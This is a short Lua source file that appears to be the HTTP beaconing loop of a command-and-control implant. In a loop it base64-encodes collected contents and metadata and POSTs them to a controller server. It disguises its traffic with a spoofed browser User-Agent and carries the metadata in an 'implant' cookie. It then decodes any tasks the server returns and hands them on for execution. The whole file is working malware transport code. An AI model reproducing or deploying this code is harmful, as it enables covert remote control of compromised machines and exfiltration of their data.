local ltn12 = require "ltn12"
local http = require "socket.http"
local url = require "socket.url"
local mime = require "mime"
local implant = require "implant"
local messages = require "messages"

while implant.running() do
  local server, metadata, contents = messages.retrieve()
  local metadata = mime.b64(metadata)
  local contents = mime.b64(contents)
  if not contents then contents = "" end

  local res_body = {}
  local _, res_code, res_headers, res_status = http.request {
      method = "POST",
      url = server,
      source = ltn12.source.string(contents),
      headers =
      {
          ["Accept"] = "*/*",
          ["Content-Type"] = "text/plain",
          ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
          ["Content-Length"] = string.len(contents),
          ["Cookie"] = "implant=" .. url.escape(metadata),
      },
      sink = ltn12.sink.table(res_body)
  }

  if res_code == 200 then
      local data = mime.unb64(table.concat(res_body))
      if data ~= nil then
          messages.submit(data)
      end
  elseif res_code == 204 then
      -- no tasks provided, do nothing
  else
      error("Got status code " .. res_code .. ", expecting 200 or 204")
  end

  implant.sleep()
end
